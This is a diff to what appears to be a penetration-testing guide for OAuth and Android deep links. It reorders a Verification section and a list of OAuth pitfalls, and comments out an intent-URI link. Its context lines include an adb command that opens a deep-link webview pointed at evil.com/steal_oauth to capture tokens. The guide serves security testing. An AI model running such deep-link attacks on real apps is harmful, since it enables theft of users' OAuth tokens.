@@ -209,7 +209,7 @@ adb shell am start -a android.intent.action.VIEW \
   -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"
 
 # Craft intent URI for web-based exploit
-<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
+# <a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
 ```
 
 ### Token Endpoint Auth Bypass
@@ -405,20 +405,20 @@ A server-side prefix-match flaw on `redirect_uri` is **necessary but not suffici
 
 ---
 
-## Verification
-
-- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
-- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
-- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
-
----
-
 ## Pitfalls
 - **redirect_uri open redirect without token theft** — redirecting to evil.com doesn't steal the token unless the victim's browser follows the redirect with the code/state.
 - **CSRF on authorization endpoint** — state parameter missing allows CSRF on OAuth flow. Test if the `state` parameter is validated.
 - **PKCE missing on public clients** — SPA/native apps without PKCE are vulnerable to authorization code interception.
 - **implicit flow still in use** — implicit flow (response_type=token) leaks tokens in URL fragments/referers. Report as deprecated, not necessarily exploitable.
 - **Client secret in frontend code** — OAuth client secrets in JS bundles are effectively public. The attack is what the secret enables, not its presence.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
